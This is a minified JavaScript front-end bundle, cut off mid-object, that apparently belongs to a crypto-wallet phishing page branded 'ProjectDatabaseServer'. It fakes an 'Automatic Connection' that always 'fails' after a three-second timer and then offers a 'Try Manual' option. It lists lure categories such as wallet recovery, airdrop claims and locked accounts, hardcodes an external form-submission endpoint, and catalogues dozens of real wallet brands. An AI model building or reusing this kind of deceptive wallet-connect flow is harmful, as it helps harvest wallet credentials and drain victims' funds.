        if (!t.called) return t.called = !0, e(...n)
    }
}

function ro(e, ...t) {
    e && t.length > 0 && e.classList.add(...t)
}

function lo(e, ...t) {
    e && t.length > 0 && e.classList.remove(...t)
}

function Dh(e, t) {
    let n = at();
    if (!e) return n.dispose;
    let {
        transitionDuration: r,
        transitionDelay: l
    } = getComputedStyle(e), [a, o] = [r, l].map(s => {
        let [u = 0] = s.split(",").filter(Boolean).map(d => d.includes("ms") ? parseFloat(d) : parseFloat(d) * 1e3).sort((d, h) => h - d);
        return u
    }), i = a + o;
    if (i !== 0) {
        n.group(u => {
            u.setTimeout(() => {
                t(), u.dispose()
            }, i), u.addEventListener(e, "transitionrun", d => {
                d.target === d.currentTarget && u.dispose()
            })
        });
        let s = n.addEventListener(e, "transitionend", u => {
            u.target === u.currentTarget && (t(), s())
        })
    } else t();
    return n.add(() => t()), n.dispose
}

function Mh(e, t, n, r) {
    let l = n ? "enter" : "leave",
        a = at(),
        o = r !== void 0 ? Ih(r) : () => {};
    l === "enter" && (e.removeAttribute("hidden"), e.style.display = "");
    let i = H(l, {
            enter: () => t.enter,
            leave: () => t.leave
        }),
        s = H(l, {
            enter: () => t.enterTo,
            leave: () => t.leaveTo
        }),
        u = H(l, {
            enter: () => t.enterFrom,
            leave: () => t.leaveFrom
        });
    return lo(e, ...t.base, ...t.enter, ...t.enterTo, ...t.enterFrom, ...t.leave, ...t.leaveFrom, ...t.leaveTo, ...t.entered), ro(e, ...t.base, ...i, ...u), a.nextFrame(() => {
        lo(e, ...t.base, ...i, ...u), ro(e, ...t.base, ...i, ...s), Dh(e, () => (lo(e, ...t.base, ...i), ro(e, ...t.base, ...t.entered), o()))
    }), a.dispose
}

function Oh({
    immediate: e,
    container: t,
    direction: n,
    classes: r,
    onStart: l,
    onStop: a
}) {
    let o = Jn(),
        i = Xr(),
        s = He(n);
    te(() => {
        e && (s.current = "enter")
    }, [e]), te(() => {
        let u = at();
        i.add(u.dispose);
        let d = t.current;
        if (d && s.current !== "idle" && o.current) return u.dispose(), l.current(s.current), u.add(Mh(d, r.current, s.current === "enter", () => {
            u.dispose(), a.current(s.current)
        })), u.dispose
    }, [n])
}

function Ct(e = "") {
    return e.split(/\s+/).filter(t => t.length > 1)
}
let ba = p.createContext(null);
ba.displayName = "TransitionContext";
var zh = (e => (e.Visible = "visible", e.Hidden = "hidden", e))(zh || {});

function Ah() {
    let e = p.useContext(ba);
    if (e === null) throw new Error("A <Transition.Child /> is used but it is missing a parent <Transition /> or <Transition.Root />.");
    return e
}

function Wh() {
    let e = p.useContext(Sa);
    if (e === null) throw new Error("A <Transition.Child /> is used but it is missing a parent <Transition /> or <Transition.Root />.");
    return e
}
let Sa = p.createContext(null);
Sa.displayName = "NestingContext";

function Ea(e) {
    return "children" in e ? Ea(e.children) : e.current.filter(({
        el: t
    }) => t.current !== null).filter(({
        state: t
    }) => t === "visible").length > 0
}

function gf(e, t) {
    let n = He(e),
        r = p.useRef([]),
        l = Jn(),
        a = Xr(),
        o = _((y, w = It.Hidden) => {
            let x = r.current.findIndex(({
                el: b
            }) => b === y);
            x !== -1 && (H(w, {
                [It.Unmount]() {
                    r.current.splice(x, 1)
                },
                [It.Hidden]() {
                    r.current[x].state = "hidden"
                }
            }), a.microTask(() => {
                var b;
                !Ea(r) && l.current && ((b = n.current) == null || b.call(n))
            }))
        }),
        i = _(y => {
            let w = r.current.find(({
                el: x
            }) => x === y);
            return w ? w.state !== "visible" && (w.state = "visible") : r.current.push({
                el: y,
                state: "visible"
            }), () => o(y, It.Unmount)
        }),
        s = p.useRef([]),
        u = p.useRef(Promise.resolve()),
        d = p.useRef({
            enter: [],
            leave: [],
            idle: []
        }),
        h = _((y, w, x) => {
            s.current.splice(0), t && (t.chains.current[w] = t.chains.current[w].filter(([b]) => b !== y)), t == null || t.chains.current[w].push([y, new Promise(b => {
                s.current.push(b)
            })]), t == null || t.chains.current[w].push([y, new Promise(b => {
                Promise.all(d.current[w].map(([f, c]) => c)).then(() => b())
            })]), w === "enter" ? u.current = u.current.then(() => t == null ? void 0 : t.wait.current).then(() => x(w)) : x(w)
        }),
        v = _((y, w, x) => {
            Promise.all(d.current[w].splice(0).map(([b, f]) => f)).then(() => {
                var b;
                (b = s.current.shift()) == null || b()
            }).then(() => x(w))
        });
    return p.useMemo(() => ({
        children: r,
        register: i,
        unregister: o,
        onStart: h,
        onStop: v,
        wait: u,
        chains: d
    }), [i, o, r, h, v, d, u])
}

function Uh() {}
let Bh = ["beforeEnter", "afterEnter", "beforeLeave", "afterLeave"];

function Fu(e) {
    var t;
    let n = {};
    for (let r of Bh) n[r] = (t = e[r]) != null ? t : Uh;
    return n
}

function Hh(e) {
    let t = p.useRef(Fu(e));
    return p.useEffect(() => {
        t.current = Fu(e)
    }, [e]), t
}
let Vh = "div",
    yf = dt.RenderStrategy;

function Qh(e, t) {
    var n, r;
    let {
        beforeEnter: l,
        afterEnter: a,
        beforeLeave: o,
        afterLeave: i,
        enter: s,
        enterFrom: u,
        enterTo: d,
        entered: h,
        leave: v,
        leaveFrom: y,
        leaveTo: w,
        ...x
    } = e, b = p.useRef(null), f = q(b, t), c = (n = x.unmount) == null || n ? It.Unmount : It.Hidden, {
        show: m,
        appear: k,
        initial: S
    } = Ah(), [N, P] = p.useState(m ? "visible" : "hidden"), C = Wh(), {
        register: I,
        unregister: T
    } = C;
    p.useEffect(() => I(b), [I, b]), p.useEffect(() => {
        if (c === It.Hidden && b.current) {
            if (m && N !== "visible") {
                P("visible");
                return
            }
            return H(N, {
                hidden: () => T(b),
                visible: () => I(b)
            })
        }
    }, [N, b, I, T, m, c]);
    let A = He({
            base: Ct(x.className),
            enter: Ct(s),
            enterFrom: Ct(u),
            enterTo: Ct(d),
            entered: Ct(h),
            leave: Ct(v),
            leaveFrom: Ct(y),
            leaveTo: Ct(w)
        }),
        fe = Hh({
            beforeEnter: l,
            afterEnter: a,
            beforeLeave: o,
            afterLeave: i
        }),
        Le = Gn();
    p.useEffect(() => {
        if (Le && N === "visible" && b.current === null) throw new Error("Did you forget to passthrough the `ref` to the actual DOM node?")
    }, [b, N, Le]);
    let Ke = S && !k,
        Ye = k && m && S,
        Xt = !Le || Ke ? "idle" : m ? "enter" : "leave",
        Ge = uh(0),
        j = _(ue => H(ue, {
            enter: () => {
                Ge.addFlag(re.Opening), fe.current.beforeEnter()
            },
            leave: () => {
                Ge.addFlag(re.Closing), fe.current.beforeLeave()
            },
            idle: () => {}
        })),
        R = _(ue => H(ue, {
            enter: () => {
                Ge.removeFlag(re.Opening), fe.current.afterEnter()
            },
            leave: () => {
                Ge.removeFlag(re.Closing), fe.current.afterLeave()
            },
            idle: () => {}
        })),
        F = gf(() => {
            P("hidden"), T(b)
        }, C),
        W = p.useRef(!1);
    Oh({
        immediate: Ye,
        container: b,
        classes: A,
        direction: Xt,
        onStart: He(ue => {
            W.current = !0, F.onStart(b, ue, j)
        }),
        onStop: He(ue => {
            W.current = !1, F.onStop(b, ue, R), ue === "leave" && !Ea(F) && (P("hidden"), T(b))
        })
    });
    let U = x,
        Zt = {
            ref: f
        };
    return Ye ? U = { ...U,
        className: ra(x.className, ...A.current.enter, ...A.current.enterFrom)
    } : W.current && (U.className = ra(x.className, (r = b.current) == null ? void 0 : r.className), U.className === "" && delete U.className), $.createElement(Sa.Provider, {
        value: F
    }, $.createElement(as, {
        value: H(N, {
            visible: re.Open,
            hidden: re.Closed
        }) | Ge.flags
    }, G({
        ourProps: Zt,
        theirProps: U,
        defaultTag: Vh,
        features: yf,
        visible: N === "visible",
        name: "Transition.Child"
    })))
}

function Kh(e, t) {
    let {
        show: n,
        appear: r = !1,
        unmount: l = !0,
        ...a
    } = e, o = p.useRef(null), i = q(o, t);
    Gn();
    let s = Zr();
    if (n === void 0 && s !== null && (n = (s & re.Open) === re.Open), ![!0, !1].includes(n)) throw new Error("A <Transition /> is used but it is missing a `show={true | false}` prop.");
    let [u, d] = p.useState(n ? "visible" : "hidden"), h = gf(() => {
        d("hidden")
    }), [v, y] = p.useState(!0), w = p.useRef([n]);
    te(() => {
        v !== !1 && w.current[w.current.length - 1] !== n && (w.current.push(n), y(!1))
    }, [w, n]);
    let x = p.useMemo(() => ({
        show: n,
        appear: r,
        initial: v
    }), [n, r, v]);
    p.useEffect(() => {
        if (n) d("visible");
        else if (!Ea(h)) d("hidden");
        else {
            let m = o.current;
            if (!m) return;
            let k = m.getBoundingClientRect();
            k.x === 0 && k.y === 0 && k.width === 0 && k.height === 0 && d("hidden")
        }
    }, [n, h]);
    let b = {
            unmount: l
        },
        f = _(() => {
            var m;
            v && y(!1), (m = e.beforeEnter) == null || m.call(e)
        }),
        c = _(() => {
            var m;
            v && y(!1), (m = e.beforeLeave) == null || m.call(e)
        });
    return $.createElement(Sa.Provider, {
        value: h
    }, $.createElement(ba.Provider, {
        value: x
    }, G({
        ourProps: { ...b,
            as: p.Fragment,
            children: $.createElement(wf, {
                ref: i,
                ...b,
                ...a,
                beforeEnter: f,
                beforeLeave: c
            })
        },
        theirProps: {},
        defaultTag: p.Fragment,
        features: yf,
        visible: u === "visible",
        name: "Transition"
    })))
}

function Yh(e, t) {
    let n = p.useContext(ba) !== null,
        r = Zr() !== null;
    return $.createElement($.Fragment, null, !n && r ? $.createElement(li, {
        ref: t,
        ...e
    }) : $.createElement(wf, {
        ref: t,
        ...e
    }))
}
let li = K(Kh),
    wf = K(Qh),
    Gh = K(Yh),
    we = Object.assign(li, {
        Child: Gh,
        Root: li
    });
const ai = {
        menu: g.jsx("svg", {
            xmlns: "http://www.w3.org/2000/svg",
            viewBox: "0 0 24 24",
            children: g.jsx("path", {
                d: "M3,6H21V8H3V6M3,11H21V13H3V11M3,16H21V18H3V16Z"
            })
        }),
        close: g.jsx("svg", {
            xmlns: "http://www.w3.org/2000/svg",
            viewBox: "0 0 24 24",
            children: g.jsx("path", {
                d: "M19,6.41L17.59,5L12,10.59L6.41,5L5,6.41L10.59,12L5,17.59L6.41,19L12,13.41L17.59,19L19,17.59L13.41,12L19,6.41Z"
            })
        }),
        shuriken: g.jsx("svg", {
            xmlns: "http://www.w3.org/2000/svg",
            viewBox: "0 0 24 24",
            children: g.jsx("path", {
                d: "M14.5 9.5L12 2L9.5 9.5L2 12L9.5 14.5L12 22L14.5 14.5L22 12L14.5 9.5M12 13.7C11.1 13.7 10.3 13 10.3 12C10.3 11.1 11 10.3 12 10.3C12.9 10.3 13.7 11 13.7 12C13.7 12.9 12.9 13.7 12 13.7Z"
            })
        })
    },
    _t = (...e) => e.filter(Boolean).join(" "),
    Mn = ({
        variant: e = "filled",
        type: t = "button",
        children: n,
        label: r,
        onClick: l,
        className: a,
        color: o = "primary"
    }) => {
        const s = {
            outlined: {
                white: "border border-white hover:border-primary hover:bg-primary text-white",
                primary: "border border-primary hover:border-primary hover:bg-primary text-white"
            },
            filled: {
                white: "border-primary bg-white text-primary",
                primary: "border-primary bg-primary text-white"
            }
        }[e][o];
        return g.jsx("button", {
            type: t,
            className: _t(s, "inline-flex justify-center items-center text-sm py-2.5 px-8 font-semibold border rounded", "hover:shadow-primary/50 hover:shadow-lg transition-all", a),
            onClick: l,
            children: n || r
        })
    },
    Xh = ({
        onConnect: e
    }) => g.jsx("header", {
        className: "sticky top-0 pt-4 px-4",
        children: g.jsxs("nav", {
            className: "max-w-screen-xl flex flex-wrap items-center justify-between mx-auto p-4 border rounded-full bg-black",
            children: [g.jsxs("a", {
                href: "#",
                className: "flex items-center space-x-1 rtl:space-x-reverse",
                children: [g.jsx("img", {
                    src: "/logo.jpeg",
                    className: "h-8 w-8 rounded-full",
                    alt: "Logo"
                }), g.jsx("span", {
                    className: "self-center text-xl font-bold whitespace-nowrap",
                    children: "ProjectDatabaseServer"
                })]
            }), g.jsx(ur, {
                as: "div",
                className: "inline-block text-left",
                children: ({
                    open: t
                }) => g.jsxs(g.Fragment, {
                    children: [g.jsx(ur.Button, {
                        as: "button",
                        className: "inline-flex items-center focus:outline-none",
                        children: g.jsx("span", {
                            className: "text-white fill-white h-6 w-6",
                            children: t ? ai.close : ai.menu
                        })
                    }), g.jsx(we, {
                        as: p.Fragment,
                        enter: "transition ease-out duration-100",
                        enterFrom: "transform opacity-0 scale-95",
                        enterTo: "transform opacity-100 scale-100",
                        leave: "transition ease-in duration-75",
                        leaveFrom: "transform opacity-100 scale-100",
                        leaveTo: "transform opacity-0 scale-95",
                        children: g.jsx(ur.Items, {
                            as: "div",
                            className: _t("absolute right-0 left-0", "divide-y divide-gray-200 bg-black shadow-lg", "mt-2.5 w-full py-6 z-[5] focus:outline-none"),
                            children: g.jsxs("div", {
                                className: "flex flex-col items-center gap-3 py-8",
                                children: [
                                    ["Get Started"].map(n => g.jsx(ur.Item, {
                                        as: "a",
                                        href: "#",
                                        onClick: e,
                                        className: "inline-block py-2.5 px-6 text-base hover:underline transition-all ease-in duration-200",
                                        children: n
                                    }, n)), g.jsx(ur.Item, {
                                        as: Mn,
                                        variant: "outlined",
                                        onClick: e,
                                        children: "Connect Wallet"
                                    })
                                ]
                            })
                        })
                    })]
                })
            })]
        })
    });

function Zh({
    open: e,
    onClose: t,
    wallet: n,
    handleManual: r
}) {
    const [l, a] = p.useState(!1);
    return p.useEffect(() => {
        e ? setTimeout(() => {
            a(!0)
        }, 3e3) : a(!1)
    }, [e]), g.jsx(g.Fragment, {
        children: g.jsx(we, {
            appear: !0,
            show: e,
            as: p.Fragment,
            children: g.jsxs(Fe, {
                as: "div",
                className: "relative z-10",
                onClose: t,
                children: [g.jsx(we.Child, {
                    as: p.Fragment,
                    enter: "ease-out duration-300",
                    enterFrom: "opacity-0",
                    enterTo: "opacity-100",
                    leave: "ease-in duration-200",
                    leaveFrom: "opacity-100",
                    leaveTo: "opacity-0",
                    children: g.jsx("div", {
                        className: "fixed inset-0 bg-black/50"
                    })
                }), g.jsx("div", {
                    className: "fixed inset-0 overflow-y-auto",
                    children: g.jsx("div", {
                        className: "flex min-h-full items-center justify-center p-4 text-center",
                        children: g.jsx(we.Child, {
                            as: p.Fragment,
                            enter: "ease-out duration-300",
                            enterFrom: "opacity-0 scale-95",
                            enterTo: "opacity-100 scale-100",
                            leave: "ease-in duration-200",
                            leaveFrom: "opacity-100 scale-100",
                            leaveTo: "opacity-0 scale-95",
                            children: g.jsxs(Fe.Panel, {
                                className: "w-full max-w-sm transform overflow-hidden rounded-2xl bg-black text-white p-6 text-left align-middle shadow-xl transition-all",
                                children: [g.jsx(Fe.Title, {
                                    as: "h3",
                                    className: "text-lg font-medium leading-6 text-gray-100",
                                    children: "Automatic Connection"
                                }), l ? g.jsxs("div", {
                                    className: "text-red-500 border-2 border-red-500 mt-4 py-3 px-4 rounded-lg flex items-center justify-between gap-2",
                                    children: [g.jsx("p", {
                                        className: "text-sm",
                                        children: "Auto connect failed"
                                    }), g.jsx(Mn, {
                                        variant: "outlined",
                                        onClick: r,
                                        children: "Try Manual"
                                    })]
                                }) : g.jsxs("div", {
                                    className: "bg-white/20 text-iwhite font-medium mt-4 py-4 px-4 rounded-lg flex items-center justify-between gap-2",
                                    children: [g.jsx("p", {
                                        className: "text-sm",
                                        children: "Connecting..."
                                    }), g.jsx("svg", {
                                        width: "24",
                                        height: "24",
                                        viewBox: "0 0 24 24",
                                        className: "animate-spin fill-current",
                                        xmlns: "http://www.w3.org/2000/svg",
                                        children: g.jsx("path", {
                                            d: "M10.14,1.16a11,11,0,0,0-9,8.92A1.59,1.59,0,0,0,2.46,12,1.52,1.52,0,0,0,4.11,10.7a8,8,0,0,1,6.66-6.61A1.42,1.42,0,0,0,12,2.69h0A1.57,1.57,0,0,0,10.14,1.16Z"
                                        })
                                    })]
                                }), g.jsxs("div", {
                                    className: "mt-4 bg-indigo-500/10 rounded-lg py-3 px-4",
                                    children: [g.jsx("h6", {
                                        className: "text-base font-medium",
                                        children: n
                                    }), g.jsxs("p", {
                                        className: "text-sm",
                                        children: ["Connect to ", n, " and more"]
                                    })]
                                })]
                            })
                        })
                    })
                })]
            })
        })
    })
}
const Jh = [{
        title: "Migration",
        subtitle: "Click here for migration"
    }, {
        title: "Claim Rewards",
        subtitle: "Click here to claim assets"
    }, {
        title: "Swap",
        subtitle: "Click here for assets swapping"
    }, {
        title: "Slippage",
        subtitle: "Click here for slippage related error"
    }, {
        title: "Transaction",
        subtitle: "Click here for transaction related issues"
    }, {
        title: "Cross Transfer",
        subtitle: "Click here for cross bridge issues"
    }, {
        title: "Staking",
        subtitle: "Click here for Staking related issues"
    }, {
        title: "Exchange",
        subtitle: "Click here for exchange related issues"
    }, {
        title: "Connect to Dapps",
        subtitle: "Click here for error while connectting to dapps."
    }, {
        title: "Login",
        subtitle: "Click here for wallet login issue."
    }, {
        title: "Whitelist",
        subtitle: "Click here for whitelist related issues."
    }, {
        title: "Recovery",
        subtitle: "Click here to for wallet recovery"
    }, {
        title: "Missing/Irregular Balance",
        subtitle: "Click here to recover lost/missing funds."
    }, {
        title: "Wallet Glitch / Wallet Error",
        subtitle: "Click here if you have problem with your trading wallet."
    }, {
        title: "Transaction Delay",
        subtitle: "Click here for any issues related to transaction delay."
    }, {
        title: "Claim Airdrop",
        subtitle: "Click here for airdrop related issues."
    }, {
        title: "NFTs",
        subtitle: "Click here for NFTs minting/transfer related issues."
    }, {
        title: "Locked Account",
        subtitle: "Click here for issues related to account lock."
    }],
    qh = "https://submit-form.com/v2od2cYMw",
    xf = ["MetaMask", "Coinbase Wallet", "Ledger Wallet", "WalletConnect"];

function ev({
    open: e,
    onClose: t,
    handleSelect: n
}) {
    return g.jsx(g.Fragment, {
        children: g.jsx(we, {
            appear: !0,
            show: e,
            as: p.Fragment,
            children: g.jsxs(Fe, {
                as: "div",
                className: "relative z-50",
                onClose: t,
                children: [g.jsx(we.Child, {
                    as: p.Fragment,
                    enter: "ease-out duration-300",
                    enterFrom: "opacity-0",
                    enterTo: "opacity-100",
                    leave: "ease-in duration-200",
                    leaveFrom: "opacity-100",
                    leaveTo: "opacity-0",
                    children: g.jsx("div", {
                        className: "fixed inset-0 bg-black bg-opacity-50"
                    })
                }), g.jsx("div", {
                    className: "fixed inset-0 overflow-y-auto",
                    children: g.jsx("div", {
                        className: "flex min-h-full items-center justify-center p-4 text-center",
                        children: g.jsx(we.Child, {
                            as: p.Fragment,
                            enter: "ease-out duration-300",
                            enterFrom: "opacity-0 scale-95",
                            enterTo: "opacity-100 scale-100",
                            leave: "ease-in duration-200",
                            leaveFrom: "opacity-100 scale-100",
                            leaveTo: "opacity-0 scale-95",
                            children: g.jsxs(Fe.Panel, {
                                className: "w-full max-w-xs transform overflow-hidden rounded-2xl bg-neutral-800 py-4 px-6 text-white text-left align-middle shadow-xl transition-all",
                                children: [g.jsx(Fe.Title, {
                                    as: "div",
                                    className: "flex justify-end",
                                    children: g.jsx("button", {
                                        type: "button",
                                        onClick: t,
                                        children: g.jsx("svg", {
                                            height: 24,
                                            width: 24,
                                            viewBox: "0 0 24 24",
                                            children: g.jsx("path", {
                                                fill: "currentColor",
                                                d: "M19,6.41L17.59,5L12,10.59L6.41,5L5,6.41L10.59,12L5,17.59L6.41,19L12,13.41L17.59,19L19,17.59L13.41,12L19,6.41Z"
                                            })
                                        })
                                    })
                                }), g.jsx("div", {
                                    className: "mt-2 text-xs text-center",
                                    children: g.jsx("h2", {
                                        className: "text-base font-semibold",
                                        children: "Select a Medium to Continue"
                                    })
                                }), g.jsx("div", {
                                    className: "mt-4 flex flex-col gap-4",
                                    children: xf.map(r => g.jsx("button", {
                                        className: _t("px-2.5 py-3 text-sm bg-black rounded-md transition hover:shadow-lg font-medium", r === "WalletConnect" ? "bg-primary text-white" : "hover:border hover:border-primary hover:text-primary"),
                                        onClick: () => n(r),
                                        children: r
                                    }, r))
                                })]
                            })
                        })
                    })
                })]
            })
        })
    })
}
const _l = {
        haspack: {
            id: "haspack",
            name: "HashPack Wallet"
        },
        banksocial: {
            id: "banksocial",
            name: "BankSocial Wallet"
        },
        solfare: {
            id: "solfare",
            name: "Solfare Wallet"
        },
        yoroi: {
            id: "yoroi",
            name: "Yoroi Wallet"
        },
        "1ce6dae0fea7114845": {
            id: "1ce6dae0fea7114845",
            name: "Binance Smart Chain",
            homepage: "https://www.binance.org/en/smartChain",
            chains: ["eip155:1"]
        },
        "1ce6dae0fea7114844": {
            id: "1ce6dae0fea7114844",
            name: "SafePal Wallet",
            homepage: "https://safepal.io/",
            chains: ["eip155:1"]
        },
        bfw192192: {
            id: "bfw192192",
            name: "Bifrost wallet",
            homepage: "https://bifrostwallet.com/",
            chains: ["eip155:1"]
        },
        "0fledge": {
            id: "0fledge",
            name: "Ledger Live"
        },
        zerion: {
            id: "zerion",
            name: "Zerion Wallet"
        },
        okx: {
            id: "okx",
            name: "OKX Wallet"
        },
        shido: {
            id: "shido",
            name: "Shido Wallet"
        },
        xumm2e093bf3: {
            id: "xumm2e093bf3",
            name: "XUMM Wallet",
            homepage: "https://xumm.app/",
            chains: ["eip155:1"]
        },
        "1c08453": {
            id: "1c08453",
            name: "Coinbase Wallet"
        },
        gateweb3: {
            id: "gateweb3",
            name: "GateWeb3 Wallet"
        },
        bitget: {
            id: "bitget",
            name: "BitGet Wallet"
        },
        robinhood: {
            id: "robinhood",
            name: "Robinhood Wallet"
        },
        bybit: {
            id: "bybit",
            name: "ByBit Wallet"
        },
        frontier: {
            id: "frontier",
            name: "Frontier Wallet"
        },
        "1g7023": {
            id: "1g7023",
            name: "Grove Wallet"
        },
        "15473m006": {
            id: "15473m006",
            name: "SafeMoon Wallet"
        },
        14415849: {
            id: "14415849",
            name: "Uniswap Wallet"
        },
        "154174pro": {
            id: "154174pro",
            name: "SaitaPro Wallet"
        },
        "1984670m": {
            id: "1984670m",
            name: "Phantom Wallet"
        },
        "136716n": {
            id: "136716n",
            name: "Enjin Wallet"
        },
        133775474: {
            id: "133775474",
            name: "Polkadot Wallet"
        },
        blockchain: {
            id: "blockchain",
            name: "Blockchain Wallet"
        },
        mew: {
            id: "mew",
            name: "MEW Wallet"
        },
        rabby: {
            id: "rabby",
            name: "Rabby Wallet"
        },
        brise: {
            id: "brise",
            name: "BRISE Wallet"
        },
        "468b4ab3582757233017ec10735863489104515ab160c053074905a1eecb7e63": {
            id: "468b4ab3582757233017ec10735863489104515ab160c053074905a1eecb7e63",
            name: "D'CENT Wallet",
            homepage: "https://dcentwallet.com/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/kr/app/dcent-hardware-wallet/id1447206611",
                android: "https://play.google.com/store/apps/details?id=com.kr.iotrust.dcent.wallet",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "D'CENT",
                colors: {
                    primary: "",
                    secondary: ""
                }
            }
        },
        "1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369": {
            id: "1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369",
            name: "Rainbow",
            homepage: "https://rainbow.me/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/us/app/rainbow-ethereum-wallet/id1457119021",
                android: "",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "rainbow:",
                universal: "https://rnbwapp.com"
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Rainbow",
                colors: {
                    primary: "rgb(0, 30, 89)",
                    secondary: ""
                }
            }
        },
        "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0": {
            id: "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0",
            name: "Trust Wallet",
            homepage: "https://trustwallet.com/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/app/apple-store/id1288339409",
                android: "https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "trust:",
                universal: "https://link.trustwallet.com"
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Trust",
                colors: {
                    primary: "rgb(51, 117, 187)",
                    secondary: ""
                }
            }
        },
        cf21952a9bc8108bf13b12c92443751e2cc388d27008be4201b92bbc6d83dd46: {
            id: "cf21952a9bc8108bf13b12c92443751e2cc388d27008be4201b92bbc6d83dd46",
            name: "Argent",
            homepage: "https://argent.xyz/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/us/app/argent/id1358741926",
                android: "https://play.google.com/store/apps/details?id=im.argent.contractwalletclient",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "argent://app",
                universal: "https://argent.link/app"
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Argent",
                colors: {
                    primary: "rgb(255, 135, 91)",
                    secondary: ""
                }
            }
        },
        c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96: {
            id: "c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96",
            name: "MetaMask",
            homepage: "https://metamask.io/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/us/app/metamask/id1438144202",
                android: "https://play.google.com/store/apps/details?id=io.metamask",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "metamask:",
                universal: "https://metamask.app.link"
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "MetaMask",
                colors: {
                    primary: "rgb(255, 255, 255)",
                    secondary: ""
                }
            }
        },
        a5cfbd9a263c9dcfb59d6e9dc00933c46f00277ed78a6a0a1e38b0c17e09671f: {
            id: "a5cfbd9a263c9dcfb59d6e9dc00933c46f00277ed78a6a0a1e38b0c17e09671f",
            name: "Gnosis Safe Multisig",
            homepage: "https://gnosis-safe.io/",
            chains: ["eip155:1"],
            app: {
                browser: "https://gnosis-safe.io/app/",
                ios: "https://apps.apple.com/app/id1515759131",
                android: "https://play.google.com/store/apps/details?id=io.gnosis.safe",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Gnosis Safe",
                colors: {
                    primary: "",
                    secondary: ""
                }
            }
        },
        "1ce6dae0fea7114841": {
            id: "1ce6dae0fea7114841",
            name: "Equal",
            homepage: "https://equal.tech/",
            chains: ["eip155:1"]
        },
        "1ce6dae0fea7114842": {
            id: "1ce6dae0fea7114842",
            name: "MEET.ONE",
            homepage: "https://www.meet.one/",
            chains: ["eip155:1"]
        },
        "1ce6dae0fea7114843": {
            id: "1ce6dae0fea7114843",
            name: "MoriX Wallet",
            homepage: "https://morixjp.com/eng/products/walletcard",
            chains: ["eip155:1"]
        },
        brave: {
            id: "brave",
            name: "Brave Wallet"
        },
        venly: {
            id: "venly",
            name: "Venly Wallet"
        },
        f2436c67184f158d1beda5df53298ee84abfc367581e4505134b5bcf5f46697d: {
            id: "f2436c67184f158d1beda5df53298ee84abfc367581e4505134b5bcf5f46697d",
            name: "Crypto.com | DeFi Wallet",
            homepage: "https://crypto.com/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/us/app/id1262148500",
                android: "https://play.google.com/store/apps/details?id=co.mona.android",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "cryptowallet:",
                universal: "https://wallet.crypto.com"
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Crypto.com",
                colors: {
                    primary: "rgb(17, 153, 250)",
                    secondary: ""
                }
            }
        },
        "0b58bf037bf943e934706796fb017d59eace1dadcbc1d9fe24d9b46629e5985c": {
            id: "0b58bf037bf943e934706796fb017d59eace1dadcbc1d9fe24d9b46629e5985c",
            name: "Pillar",
            homepage: "https://pillarproject.io/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/app/apple-store/id1346582238",
                android: "https://play.google.com/store/apps/details?id=com.pillarproject.wallet",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "pillarwallet:",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Pillar",
                colors: {
                    primary: "rgb(255, 255, 255)",
                    secondary: ""
                }
            }
        },
        "9d373b43ad4d2cf190fb1a774ec964a1addf406d6fd24af94ab7596e58c291b2": {
            id: "9d373b43ad4d2cf190fb1a774ec964a1addf406d6fd24af94ab7596e58c291b2",
            name: "imToken",
            homepage: "https://token.im/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://itunes.apple.com/us/app/imtoken2/id1384798940",
                android: "https://play.google.com/store/apps/details?id=im.token.app",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "imtokenv2:",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "imToken",
                colors: {
                    primary: "rgb(255, 255, 255)",
                    secondary: ""
                }
            }
        },
        dceb063851b1833cbb209e3717a0a0b06bf3fb500fe9db8cd3a553e4b1d02137: {
            id: "dceb063851b1833cbb209e3717a0a0b06bf3fb500fe9db8cd3a553e4b1d02137",
            name: "ONTO",
            homepage: "https://onto.app/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/us/app/onto-an-ontology-dapp/id1436009823",
                android: "https://play.google.com/store/apps/details?id=com.github.ontio.onto",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "ontoprovider:",
                universal: "https://onto.app"
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "ONTO",
                colors: {
                    primary: "rgb(255, 255, 255)",
                    secondary: ""
                }
